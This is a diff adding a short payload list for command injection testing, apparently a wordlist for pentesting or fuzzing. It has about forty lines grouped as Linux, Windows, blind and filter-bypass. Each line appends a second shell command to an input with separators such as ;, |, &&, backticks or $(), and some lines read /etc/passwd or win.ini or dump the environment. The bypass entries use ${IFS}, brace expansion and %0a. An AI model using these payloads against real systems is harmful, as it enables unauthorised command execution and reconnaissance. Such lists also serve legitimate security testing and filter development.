@@ -1,0 +1,40 @@
+# Command Injection Basic Payloads
+# Linux
+; ls
+| ls
+& ls
+|| ls
+&& ls
+`ls`
+$(ls)
+; id
+| id
+; whoami
+| whoami
+; cat /etc/passwd
+| cat /etc/passwd
+; uname -a
+| uname -a
+; pwd
+; env
+
+# Windows
+& dir
+| dir
+& whoami
+| whoami
+& hostname
+& ipconfig
+& type C:\Windows\win.ini
+
+# Blind
+; sleep 5
+| sleep 5
+& ping -c 5 127.0.0.1
+& ping -n 5 127.0.0.1
+
+# Filter bypass
+;l$()s
+;l${IFS}s
+;{ls,}
+%0als
